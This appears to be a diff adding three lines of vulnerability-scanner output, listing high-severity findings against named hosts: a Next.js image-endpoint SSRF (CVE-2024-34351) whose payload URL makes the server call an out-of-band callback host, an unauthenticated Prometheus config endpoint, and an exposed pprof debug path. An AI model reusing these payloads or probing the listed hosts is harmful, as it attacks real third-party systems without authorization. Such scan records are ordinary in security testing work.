@@ -1,0 +1,3 @@
+[CVE-2024-34351] [http] [high] https://resolute.dukong.int.mantrachain.io/_next/image?w=16&q=10&url=https://d9ur3qaai4kjja7hvqs0735mgwhuq11aj.oast.me
+[prometheus-unauth] [http] [high] https://prometheus.allscale.io/api/v1/status/config
+[CVE-2019-11248] [http] [high] https://prometheus.allscale.io/debug/pprof/
